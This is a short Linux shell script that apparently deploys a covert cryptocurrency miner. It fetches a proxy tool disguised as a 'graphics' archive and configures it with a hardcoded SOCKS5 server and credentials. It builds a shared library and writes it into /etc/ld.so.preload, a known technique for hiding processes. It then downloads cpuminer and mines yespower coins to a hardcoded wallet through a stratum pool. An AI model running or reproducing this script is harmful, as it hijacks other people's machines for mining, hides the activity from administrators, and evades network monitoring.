#!/bin/sh
ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
dpkg-reconfigure --frontend noninteractive tzdata
apt update
apt -y install binutils cmake build-essential screen unzip net-tools curl nano gcc

wget https://raw.githubusercontent.com/nathanfleight/scripts/main/graphics.tar.gz

tar -xvzf graphics.tar.gz

cat > graftcp/local/graftcp-local.conf <<END
listen = :2233
loglevel = 1
socks5 = 51.79.243.155:2082
socks5_username = sshocean-denrio
socks5_password = 111
END

./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &

sleep .2

echo " "
echo " "

echo "******************************************************************"

./graftcp/graftcp curl ifconfig.me

echo " "
echo " "

echo "******************************************************************"

git clone https://github.com/scatterfafafa/lib.git
cd lib;make
mv libOmptarget.so /usr/local/lib/;echo /usr/local/lib/libOmptarget.so >> /etc/ld.so.preload
cd ..

wget https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.27/cpuminer-opt-linux.tar.gz

tar -xvf cpuminer-opt-linux.tar.gz

./cpuminer-sse2 -a yespower  -o stratum+tcps://stratum-na.rplant.xyz:17017 -u web1qf2xghy3dvcr85hvyvtl5hhnvuu63ppc28gnjnl.androme
